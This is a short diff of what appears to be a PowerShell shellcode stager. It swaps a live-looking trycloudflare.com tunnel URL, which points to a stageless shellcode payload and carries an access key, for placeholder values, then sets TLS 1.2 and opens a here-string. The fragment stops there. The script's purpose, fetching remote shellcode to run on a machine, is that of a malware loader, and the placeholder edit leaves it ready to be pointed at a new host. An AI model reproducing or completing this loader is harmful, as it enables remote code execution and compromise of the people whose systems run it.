@@ -1,4 +1,4 @@
-$u="https://geometry-offered-guns-replies.trycloudflare.com/payloads/shellcode_stageless.txt?key=8ca60eebbe9a141869305ed9ab1a0050"
+$u="https://CHANGE-MECHANGE-ME.trycloudflare.com/payloads/shellcode_stageless.txt?key=PLACEHOLDER_TOKEN"
 [Net.ServicePointManager]::SecurityProtocol="Tls12"
 
 $c=@"
